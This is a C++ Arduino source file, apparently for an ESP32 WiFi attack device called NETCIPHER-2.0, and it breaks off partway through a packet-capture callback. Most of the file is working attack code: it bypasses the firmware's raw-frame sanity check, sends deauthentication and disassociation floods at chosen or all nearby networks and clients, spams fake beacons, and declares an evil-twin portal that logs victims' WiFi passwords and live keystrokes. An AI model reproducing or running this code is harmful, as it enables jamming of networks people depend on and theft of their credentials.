/*
Project Name:- NETCIPHER-2.0
Owner:-Apex-ux-coder(ApexCipher)
*/

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <U8g2lib.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <ArduinoJson.h>
#include <LittleFS.h>

#include "HTML.h"
#include "BeaconSpammer.h"
BeaconSpammer beaconSpam(true, true); // WPA2 enabled, append spaces

// Screen states
#define SCREEN_MAIN        0
#define SCREEN_ATTACK      1
#define SCREEN_SELECT      2
#define SCREEN_ABOUT       3
#define SCREEN_SCANNING    4
#define SCREEN_SELECT_MENU 5

#define SCREEN_DEAUTHER    6
#define SCREEN_LOGS        7
#define SCREEN_LOG_DETAIL  8
#define SCREEN_STATION_SCAN 9
#define SCREEN_STATION_SELECT 10
#define SCREEN_STATION_DEAUTH 11

#define SCREEN_DEAUTH_MONITOR_SCAN 12
#define SCREEN_DEAUTH_MONITOR      13
// Hidden SSID recovery screens
#define SCREEN_HIDDEN_SCAN      14
#define SCREEN_HIDDEN_RECOVER    15
#define SCREEN_HIDDEN_SUCCESS    16
#define SCREEN_DEAUTH_FLOOD 17
#define SCREEN_DEAUTH_ALL 18
#define SCREEN_CLOCK 19
#define SCREEN_REACTIVE_DEAUTH 20
#define SCREEN_AC_DETECTOR 21 
#define SCREEN_NEARBY_SCAN 22
#define SCREEN_NEARBY_RESULTS 23

#define VERTICAL_BAR_WIDTH 5
#define VERTICAL_BAR_HEIGHT 12
const unsigned char verticalBar[] = {
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000,
  0b00010000
};

// Checkmark bitmap
const unsigned char checkmark[] = {
  0b11111111,
  0b11111111,
  0b11111111,
  0b11111111,
  0b11111111,
  0b11111111,
  0b11111111,
  0b11111111
};

// WiFi signal bitmap
const unsigned char wifiSignal[] = {
  0b00011000,
  0b00100100,
  0b01000010,
  0b10011001,
  0b00000000,
  0b00011000,
  0b00011000,
  0b00000000
};

String _correct = "";
String _tryPassword = "";

// OLED Display setup
U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE);

// Button pins for ESP32
#define BUTTON_UP   26
#define BUTTON_DOWN 32
#define BUTTON_OK   27
#define BUTTON_BACK 25

// LED indicator pin
#define LED_PIN 2
// Optional: LED indicator for live wire detection
#define AC_LED_PIN 4  // Optional, set to -1 to disable

// Log file path (only passwords now)
#define LOG_FILE "/passwords.log"
#define MAX_PASSWORD_LOGS 100
#define MAX_STATIONS 100
#define MAX_TARGETS 16
#define MAX_TYPING_HISTORY 20

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
WebServer webServer(80);

// Structure for WiFi networks
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  wifi_auth_mode_t authmode;
  bool selected;
} _Network;

// Structure for password logs
typedef struct {
  String ssid;
  String bssid;
  String password;
  bool verified;
} PasswordLogEntry;

// Structure for real-time typing monitoring
typedef struct {
  String input;
  unsigned long timestamp;
  bool submitted;
  bool verifying;
  bool success;
  String clientIP;
} TypingEntry;

// Deauth monitor structures
#define MAX_DEAUTH_EVENTS 10
struct DeauthEvent {
    String apMac;
    String apSsid;
    String stationMac;
    unsigned long time;
    int8_t rssi;           // ← ADD THIS LINE
    uint8_t reason;  // ADD THIS
};

_Network _networks[MAX_TARGETS];
_Network deauthNetworks[MAX_TARGETS];
int deauthNetworkCount = 0;
bool deauthMonitorActive = false;
// Scrolling text animation
unsigned long lastScrollUpdate = 0;
int scrollPos = 0;
String scrollingSSID = "";

// Channel hopping for deauth monitor
int currentMonitorChannel = 1;
unsigned long lastChannelChange = 0;
const unsigned long CHANNEL_HOP_INTERVAL = 50;
// Deauth monitor mode control
bool deauthMonitorAutomatic = true;  // true = automatic, false = manual channel selection
unsigned long deauthMonitorLastButtonPress = 0;
const unsigned long DEAUTH_MONITOR_DEBOUNCE = 200; 

volatile unsigned long monitorDeauthPacketCount = 0; 
unsigned long monitorLastDeauthPacketCount = 0;
int monitorDeauthPktsPerSecond = 0;
unsigned long monitorLastRateCalcTime = 0;
unsigned long lastDeauthTime = 0;
int activeChannels[15] = {0};
int activeChannelCount = 0;
int channelIndex = 0;
unsigned long lastChannelListRebuild = 0;

unsigned long lastRateUpdate = 0;
uint32_t apPacketCounter = 0;
int currentChannelHop = 1;
int hopDirection = 1;
bool sentToAp[MAX_TARGETS] = {false};
int cycleCompleteCount = 0;
bool ledState = false;
unsigned long lastLedBlink = 0;
int pattern = 0;
unsigned long lastDebugPrint = 0;
// Deauth event storage
DeauthEvent deauthEvents[MAX_DEAUTH_EVENTS];
int deauthEventIndex = 0;
int deauthEventCount = 0;

String capturedSSID = "";
String capturedPassword = "";
#define DEAUTH_SCAN_PASSES 3
int deauthScanPass = 0;
bool deauthScanning = false;
// Add this for pulse animation
unsigned long lastPulseUpdate = 0;
bool pulseState = false;
int hiddenRecoveryIndex = 0;
bool apAndWebRunning = true;
unsigned long clientBlinkEndTime = 0;
unsigned long lastActivityTime = 0;  
PasswordLogEntry passwordLogs[MAX_PASSWORD_LOGS];
int passwordLogCount = 0;
int selectedLogIndex = 0;
int logScrollOffset = 0;
float current_temp = 0.0;          
unsigned long last_temp_read = 0; 
String currentClientMac = "FF:FF:FF:FF:FF:FF";
String hiddenFoundMAC = "";
unsigned long hiddenFoundMACTime = 0;
const unsigned long HIDDEN_MAC_DISPLAY_TIME = 1000; 
TaskHandle_t apDeauthTaskHandle = NULL;
int currentDeauthChannel = 1;
unsigned long lastDeauthChannelChange = 0;
const unsigned long DEAUTH_CHANNEL_HOP_INTERVAL = 50; 
bool combinedDeauthActive = false;
String syncedTime = "";
String syncedDate = "";
bool timeSynced = false;
volatile bool vBtn_UP   = false;
volatile bool vBtn_DOWN = false;
volatile bool vBtn_OK   = false;
volatile bool vBtn_BACK = false;
String pendingWebCommand = "";
unsigned long lastWebCommandTime = 0;
const unsigned long WEB_COMMAND_DEBOUNCE = 500;

unsigned long lastTimeSync = 0;
bool hotspot_active = false;          
_Network evilTarget;       
bool deauthWebRestarted = false;
unsigned long lastButtonPressTime = 0;
bool displaySleep = false;
TypingEntry typingHistory[MAX_TYPING_HISTORY];
int typingHistoryCount = 0;
int typingScrollOffset = 0;
int selectedTypingIndex = 0;
unsigned long lastUserActivity = 0;
int totalConnections = 0;
String currentVerifyingIP = "";
unsigned long verificationStartTime = 0;
uint32_t reactive_deauth_count = 0;
int countNetworks();
void scanDeauthAllNetworks();
void performDeauthMonitorSyncScan();
void performReboot();
void performDeepSleep();
void savePasswordLog(String ssid, String bssid, String password, bool verified);
void clearArray();
void initACDetector();
void updateACDetector();
void drawACDetectorScreen();
void runACDetectorLoop();
void handleNotFound();
void handleWebRoot();
void handleWebCommand();
void setSoftAPChannel(int channel);
void handleWebStatus();
void handleGetAPSettings();
void handleUpdateAPSettings();
void startAccessPoint();
void stopAccessPoint();
void setupWebServer();
void initACDetector();
void updateACDetector();
void drawACDetectorScreen();
bool hasSelectedTargets();
void showNoTargetMessage();
bool isValidAP(const _Network& net);
int getSelectedTargetCount();
int getSelectedStationCount();
void startStationScan();
void stopStationScan();
bool selectNextTargetForScan();
void resetDeauthIndices();
void startDeauthSniffing();
void stopDeauthSniffing();
void startDeauthMonitor();
void stopDeauthMonitor();
void startHiddenRecovery();
void stopHiddenRecovery();
void startNextHiddenRecovery();
void handleAdmin();
void handleTimeSync();
void handleMac();
void handleResult();
void handleVerifyPage();
void handleCheckStatus();
void startEvilTwin();
void stopEvilTwin();
void drawMainMenu();
void drawHiddenRecoverScreen();
void drawHiddenSuccessScreen();
void drawDeauthAllScreen();
void drawDeauthScreen();
void drawStationSelectScreen();
void drawStationScanScreen();
void drawLogsScreen();
void drawLogDetailScreen();
void startNearbyScan();
void stopNearbyScan();
void drawNearbyScanScreen();
void drawNearbyResultsScreen();
void promiscuousCallbackNearby(void* buf, wifi_promiscuous_pkt_type_t type);
void drawDeauthMonitorScanScreen();
void drawDeauthMonitorScreen();
String bytesToStr(const uint8_t* b, uint32_t size);
void performScan();
void menu();
int scannedStationCount = 0;
uint8_t scannedStationMAC[MAX_STATIONS][6];   
uint8_t stationAPBSSIDRaw[MAX_STATIONS][6];   
int stationAPChannel[MAX_STATIONS];
bool stationSelected[MAX_STATIONS];
String stationNetworkSSID[MAX_STATIONS];      
int stationSelectIndex = 0;
int stationSelectStartIdx = 0;
bool stationDeauthActive = false;
bool reactiveDeauthActive = false;
int stationDeauthIndex = 0;      
int stationOnlyIndex = 0;        
int apFloodPattern = 0;          
int stationFloodPattern = 0;    
uint32_t packetsPerSecond = 0;
uint32_t packetCounter = 0;
unsigned long lastStationDeauthTime = 0;
const unsigned long STATION_DEAUTH_INTERVAL = 2;
int currentHopChannel = 1;
unsigned long lastHopTime = 0;
bool scanCompleted = false;  
bool scanInProgress = false;
uint32_t auth_packet_count = 0;      
uint32_t reassoc_packet_count = 0;  
uint8_t deauth_target_bssid[6];     
bool sniff_deauth_active = false;
int deauth_target_channel = 0;       
String deauth_target_ssid = "";     
bool isScanningStations = false;
int currentTargetScanIndex = 0;          
unsigned long stationScanStartTime = 0;
bool stationScanCancelled = false;
unsigned long randomStartMs = 0;
int randomHour = 0, randomMin = 0, randomSec = 0;
bool randomInit = false;
uint8_t currentScanBSSID[6];
int currentScanChannel;
String currentScanSSID;
unsigned long apScanStartTime = 0;
const unsigned long SCAN_DURATION_PER_AP = 30000;
_Network deauthAllNetworks[MAX_TARGETS];
int deauthAllNetworkCount = 0;
bool deauthAllActive = false;
int deauthAllCurrentIndex = 0;
unsigned long deauthAllApStartTime = 0;
unsigned long deauthAllLastScan = 0;
unsigned long deauthAllLastPacket = 0;
uint32_t deauthAllPacketCount = 0; 
const unsigned long DEAUTH_ALL_SCAN_INTERVAL = 120000;
const unsigned long DEAUTH_ALL_AP_DURATION = 200;     
const unsigned long DEAUTH_ALL_PACKET_INTERVAL = 1;
bool apDeauthActive = false;
unsigned long lastApDeauthTime = 0;
int currentApDeauthIndex = 0;
bool isScanningNearby = false;
bool nearbyScanCancelled = false;
unsigned long nearbyScanStartTime = 0;
int nearbyScrollOffset = 0;
int nearbySelectedIndex = 0;
int nearbyCurrentChannel = 1;  // Shared between callback and display

// Temporary storage for nearby devices (cleared each scan)
String nearbyDevices[MAX_STATIONS];
String nearbyDeviceAP[MAX_STATIONS];
int nearbyDeviceCount = 0;
// Dedicated station deauth (like AP dedicated)
int staHopChannels[15];          // Unique channels from selected stations
int staHopCount = 0;             // Number of channels
int staHopIndex = 0;             // Current channel index
unsigned long lastStaHopTime = 0;
unsigned long lastStaDeauthSend = 0;
uint32_t staHopPackets = 0;

int currentScreen = SCREEN_MAIN;
bool isManualScanning = false;
int selectMenuIndex = 0;
int ssidListStartIdx = 0;

// Enhanced scrolling variables - CHANGED from 3 to 4
int scrollOffset = 0;
int selectedItemIndex = 0;
int visibleItems = 4;

// Scan timing variables
unsigned long scanStartTime = 0;


// Main menu items - ADDED "Hidden SSID" at the end
const char* mainMenuItems[] = { 
    "SCAN WIFI", "SELECT AP", "ATTACK", "DEAUTHER", 
    "STA SCAN", "SELECT STA", "LOGS",
    "DEAUTH MONITOR", "RECOVER SSID", "DEAUTH FLOOD" ,
    "DEAUTH ALL", "DYNAMIC DEAUTH", "AC DETECTOR", "CLOCK", "NEARBY SCAN", "REBOOT", "SLEEP"
};
const int mainMenuCount = 17;  // Increased from 10 to 11

#define ATTACK_MENU_COUNT 4
int attackMenuIndex = 0;
bool deauthing_active = false;



// ADD THIS - timing

bool attack_running = false;

// Deauther variables
uint8_t deauth_frame[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
unsigned long last_packet_time = 0;

// Track connected clients
int connectedClients = 0;

// ================== HIDDEN SSID RECOVERY VARIABLES ==================
// Hidden SSID recovery specific variables
typedef struct {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
  bool isHidden;
} HiddenNetwork;

#define MAX_HIDDEN_NETWORKS 20
HiddenNetwork hiddenNetworks[MAX_HIDDEN_NETWORKS];
int hiddenNetworkCount = 0;
int hiddenSelectIndex = 0;
int hiddenSelectOffset = 0;

// Deauth Flood variables (copied from second program)
uint32_t flood_packet_count = 0;
uint32_t flood_success_count = 0;
uint32_t flood_consecutive_failures = 0;
unsigned long flood_last_packet_time = 0;
unsigned long flood_last_pattern_change = 0;
int flood_current_pattern = 0;
const uint8_t flood_broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool flood_active = false;
// Add near other station scan variables
uint32_t stationScanPacketCount = 0;  // Total packets received during station scan

// Recovery state
bool hiddenRecoveryActive = false;
uint8_t hiddenTargetBSSID[6];
int hiddenTargetChannel = 0;
String hiddenRecoveredSSID = "";
unsigned long hiddenRecoveryStartTime = 0;
const unsigned long HIDDEN_SCAN_DURATION = 60000; // 60 seconds

// Deauth for hidden networks
bool hiddenDeauthActive = false;
// Add this with your other global variables
bool webServerRunning = false;
unsigned long hiddenDeauthStartTime = 0;
unsigned long lastHiddenDeauthTime = 0;
const unsigned long HIDDEN_DEAUTH_DURATION = 10000; // 10 seconds
const unsigned long HIDDEN_DEAUTH_INTERVAL = 3;    
uint32_t hiddenDeauthPacketCount = 0;
bool powerSaveMode = false;
void setupWebServer() {
    webServer.on("/", handleWebRoot);
    webServer.on("/admin", handleAdmin);               // Always admin panel
    webServer.on("/command", HTTP_POST, handleWebCommand);
    webServer.on("/status", HTTP_GET, handleWebStatus);
    webServer.on("/sync_time", HTTP_POST, handleTimeSync);
    webServer.on("/mac", HTTP_GET, handleMac);
    webServer.on("/result", handleResult); 
    webServer.on("/verify", handleVerifyPage);        
    webServer.on("/check_status", handleCheckStatus);
    webServer.on("/get-ap-settings", HTTP_GET, handleGetAPSettings);
    webServer.on("/update-netcipher", HTTP_POST, handleUpdateAPSettings);
    webServer.onNotFound(handleNotFound);
    setupDisplayMirror();
    webServer.begin();
    webServerRunning = true;
    Serial.println("Web server started");
}
// Hidden deauth frame (separate from main deauth frame)
uint8_t hidden_deauth_frame[26] = {
    0xC0,0x00,0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x01,0x00
};

// ================== HIDDEN SSID HELPER FUNCTIONS ==================

String bssidToString(uint8_t* bssid) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(macStr);
}

bool compareBSSID(uint8_t* bssid1, uint8_t* bssid2) {
  for (int i = 0; i < 6; i++) {
    if (bssid1[i] != bssid2[i]) return false;
  }
  return true;
}

String extractSSID(const uint8_t* frame, uint16_t frame_len) {
  if (frame_len < 24) return "";

  uint8_t subtype = (frame[0] >> 4) & 0x0F;
  uint16_t offset = 24;

  switch (subtype) {
    case 0x00: offset += 4; break;
    case 0x02: offset += 10; break;
    case 0x04: break;
    case 0x05: case 0x08: offset += 12; break;
    default: return "";
  }

  while (offset + 2 <= frame_len) {
    uint8_t eid = frame[offset];
    uint8_t elen = frame[offset + 1];
    if (eid == 0 && elen > 0 && elen <= 32) {
      char ssid_buf[33] = {0};
      memcpy(ssid_buf, &frame[offset + 2], elen);
      return String(ssid_buf);
    }
    offset += 2 + elen;
    if (offset >= frame_len) break;
  }
  return "";
}

// ================== HIDDEN SSID CALLBACK ==================
void hiddenSSIDCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!hiddenRecoveryActive || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 30) return;

  uint8_t packetBSSID[6];
  memcpy(packetBSSID, &frame[16], 6);

  if (!compareBSSID(packetBSSID, hiddenTargetBSSID)) {
    return;
  }

  

  String foundSSID = extractSSID(frame, len);

  if (foundSSID.length() > 0) {
   
    if (foundSSID != hiddenRecoveredSSID) {
      hiddenRecoveredSSID = foundSSID;
      
      // Extract and store the MAC address from which SSID was discovered
      uint8_t sourceMac[6];
      memcpy(sourceMac, &frame[10], 6);
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
         sourceMac[0], sourceMac[1], sourceMac[2],
         sourceMac[3], sourceMac[4], sourceMac[5]);
         hiddenFoundMAC = String(macStr);
         // BLINK LED ON PACKET DETECTION
         digitalWrite(LED_PIN, HIGH);
         lastPulseUpdate = millis();
         pulseState = true;
        // hiddenFoundMACTime = millis();
    }
  }
}

// WSL Bypasser function
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    
    if (res == ESP_OK) {
        packet_count++;
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
    }
}
void send_station_deauth(const _Network *target, const String& stationMac = "") {
    if (!target) return;
    
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00
    };

    memcpy(&frame[10], target->bssid, 6);   // source
    memcpy(&frame[16], target->bssid, 6);   // BSSID

    if (stationMac != "") {
        uint8_t targetMac[6];
        sscanf(stationMac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
               &targetMac[0], &targetMac[1], &targetMac[2],
               &targetMac[3], &targetMac[4], &targetMac[5]);
        memcpy(&frame[4], targetMac, 6);    // destination (client)
    } else {
        memset(&frame[4], 0xFF, 6);         // broadcast
    }

    wsl_bypasser_send_raw_frame(frame, sizeof(frame));

    frame[0] = 0xA0;   // disassociate
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}
void send_deauth_frame(const _Network *target, const String& stationMac = "") {
    if (!target) return;

    
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00
    };

    esp_wifi_set_channel(target->ch, WIFI_SECOND_CHAN_NONE);

    memcpy(&frame[10], target->bssid, 6);   // source
    memcpy(&frame[16], target->bssid, 6);   // BSSID

    if (stationMac != "") {
        uint8_t targetMac[6];
        sscanf(stationMac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
               &targetMac[0], &targetMac[1], &targetMac[2],
               &targetMac[3], &targetMac[4], &targetMac[5]);
        memcpy(&frame[4], targetMac, 6);    // destination (client)
    } else {
        memset(&frame[4], 0xFF, 6);         // broadcast
    }

    wsl_bypasser_send_raw_frame(frame, sizeof(frame));

    frame[0] = 0xA0;   // disassociate
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}
void send_station_deauth_frame(const _Network *target, const String& stationMac) {
    if (!target) return;
    if (stationMac == "") return;
    
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00
    };

    memcpy(&frame[10], target->bssid, 6);
    memcpy(&frame[16], target->bssid, 6);
    
    uint8_t client_mac[6];
    sscanf(stationMac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
           &client_mac[0], &client_mac[1], &client_mac[2],
           &client_mac[3], &client_mac[4], &client_mac[5]);
    memcpy(&frame[4], client_mac, 6);

    wsl_bypasser_send_raw_frame(frame, sizeof(frame));

    frame[0] = 0xA0;
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}
// Flood version of raw frame sender 
void flood_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    
    if (res == ESP_OK) {
        flood_packet_count++;
        flood_success_count++;
        flood_consecutive_failures = 0;
    } else {
        flood_consecutive_failures++;
    }
}

// Flood version of send_attack_frame
void flood_send_attack_frame(const _Network *target, uint8_t subtype, const uint8_t *dest, const uint8_t *src, const uint8_t *bssid, uint8_t reason) {
    if (!target) return;
    
    uint8_t frame[26];
    memset(frame, 0, sizeof(frame));
    
    frame[0] = subtype;
    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);
    
    frame[24] = reason;
    frame[25] = 0;
    
    flood_send_raw_frame(frame, sizeof(frame));
}

// Flood version of send_deauth_attack (pattern 0-5)
void flood_send_deauth_attack(const _Network *target, int pattern) {
    if (!target) return;
    
    
    
    uint8_t ap_bssid[6];
    memcpy(ap_bssid, target->bssid, 6);
    
    switch(pattern) {
        case 0: // Deauth broadcast, reason 1
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 7);
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 7);
            break;
        case 1: // Deauth broadcast, reason 7
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 7);
            break;
        case 2: // Disassociate broadcast, reason 1
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            break;
        case 3: // Disassociate broadcast, reason 7
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 7);
            break;
        case 4: // Burst: deauth (reason 1) + disassociate (reason 1)
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            break;
        case 5: // Burst: deauth (reason 7) + disassociate (reason 7)
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 7);
            flood_send_attack_frame(target, 0xA0, flood_broadcast_mac, ap_bssid, ap_bssid, 7);
            break;
        default:
            flood_send_attack_frame(target, 0xC0, flood_broadcast_mac, ap_bssid, ap_bssid, 1);
            break;
    }
}
void send_deauth_to_client(uint8_t* ap_bssid, int channel, uint8_t* client_mac) {
    if (!ap_bssid) return;

    // Local frame buffer - no global sharing
    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x01, 0x00
    };

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    memcpy(&frame[10], ap_bssid, 6);   // source
    memcpy(&frame[16], ap_bssid, 6);   // BSSID
    memcpy(&frame[4], client_mac, 6);  // destination (client)

    wsl_bypasser_send_raw_frame(frame, sizeof(frame));

    frame[0] = 0xA0;   // disassociate
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

void flood_send_station_deauth(const _Network *target, const uint8_t* stationMac, int pattern) {
    if (!target || !stationMac) return;
    uint8_t ap_bssid[6];
    memcpy(ap_bssid, target->bssid, 6);

    switch(pattern) {
        case 0:
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 7);
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 7);
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 7);
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 7);
            break;
        case 1:
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 7);
            break;
        case 2:
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 1);
            break;
        case 3:
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 7);
            break;
        case 4:
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 1);
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 1);
            break;
        case 5:
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 7);
            flood_send_attack_frame(target, 0xA0, stationMac, ap_bssid, ap_bssid, 7);
            break;
        default:
            flood_send_attack_frame(target, 0xC0, stationMac, ap_bssid, ap_bssid, 1);
            break;
    }
}

//=========== HIDDEN SSID SCREEN FUNCTIONS ==================

void scanDeauthAllNetworks() {
    // Just stop other attacks, don't reset WiFi
    apDeauthActive = false;
    stationDeauthActive = false;
    flood_active = false;
    combinedDeauthActive = false;
    beaconSpam.stop();
    if (deauthMonitorActive) stopDeauthMonitor();
    if (isScanningStations) stopStationScan();
    if (hiddenRecoveryActive) stopHiddenRecovery();
    
    // Simple scan - don't change WiFi mode
    WiFi.mode(WIFI_STA);
    delay(50);
    
    Serial.println("DEAUTH ALL: Scanning for networks...");
    int n = WiFi.scanNetworks(false, true);
    
    deauthAllNetworkCount = 0;
    if (n > 0) {
        for (int i = 0; i < n && deauthAllNetworkCount < MAX_TARGETS; i++) {
            deauthAllNetworks[deauthAllNetworkCount].ssid = WiFi.SSID(i);
            memcpy(deauthAllNetworks[deauthAllNetworkCount].bssid, WiFi.BSSID(i), 6);
            deauthAllNetworks[deauthAllNetworkCount].ch = WiFi.channel(i);
            deauthAllNetworks[deauthAllNetworkCount].rssi = WiFi.RSSI(i);
            deauthAllNetworkCount++;
        }
    }
    WiFi.scanDelete();

    // ADD THESE 3 LINES RIGHT HERE Ã¢â€ â€œÃ¢â€ â€œÃ¢â€ â€œ
    WiFi.mode(WIFI_AP);                    // Line 1: Switch back to AP mode
    esp_wifi_set_mode(WIFI_MODE_AP);       // Line 2: Set ESP32 WiFi to AP mode
    esp_wifi_start();                      // Line 3: Start WiFi in AP mode
    
    if (deauthAllNetworkCount > 0) {
        // Just set flags, don't reconfigure WiFi
        deauthAllActive = true;
        deauthAllCurrentIndex = 0;
        deauthAllApStartTime = millis();
        deauthAllLastScan = millis();
        deauthAllPacketCount = 0;
        
        // Auto switch to screen
        currentScreen = SCREEN_DEAUTH_ALL;
        scrollOffset = 0;
        selectedItemIndex = 0;
        
        Serial.printf("DEAUTH ALL started: %d networks\n", deauthAllNetworkCount);
    } else {
        Serial.println("DEAUTH ALL: No networks found!");
        deauthAllActive = false;
    }
}

bool isMacAlreadySeen(String mac, String networkSSID) {
    uint8_t macRaw[6];
    sscanf(mac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
           &macRaw[0], &macRaw[1], &macRaw[2], &macRaw[3], &macRaw[4], &macRaw[5]);
    for (int i = 0; i < scannedStationCount; i++) {
        if (memcmp(scannedStationMAC[i], macRaw, 6) == 0 && stationNetworkSSID[i] == networkSSID)
            return true;
    }
    return false;
}

void addMacToSeen(String mac, String networkSSID, const uint8_t* ap_bssid, int ap_channel) {
    if (scannedStationCount >= MAX_STATIONS) return;
    if (isMacAlreadySeen(mac, networkSSID)) return;   // keep simple string compare for now

    // Convert MAC string to raw bytes (only once per station)
    uint8_t macRaw[6];
    sscanf(mac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
           &macRaw[0], &macRaw[1], &macRaw[2],
           &macRaw[3], &macRaw[4], &macRaw[5]);

    memcpy(scannedStationMAC[scannedStationCount], macRaw, 6);
    memcpy(stationAPBSSIDRaw[scannedStationCount], ap_bssid, 6);
    stationAPChannel[scannedStationCount] = ap_channel;
    stationNetworkSSID[scannedStationCount] = networkSSID;
    stationSelected[scannedStationCount] = false;
    scannedStationCount++;
}


uint8_t scanningBSSIDs[MAX_TARGETS][6];  // still used? We'll keep but not used in new callback
int scanningBSSIDCount = 0;

// ========== NEW PROMISCUOUS CALLBACK (filtered by currentScanBSSID) ==========
// ========== PROMISCUOUS CALLBACK - CAPTURES ALL PACKET TYPES ==========
void promiscuousCallbackStation(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!isScanningStations || stationScanCancelled) return;

    // Accept ALL packet types - Management, Data, AND Control
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
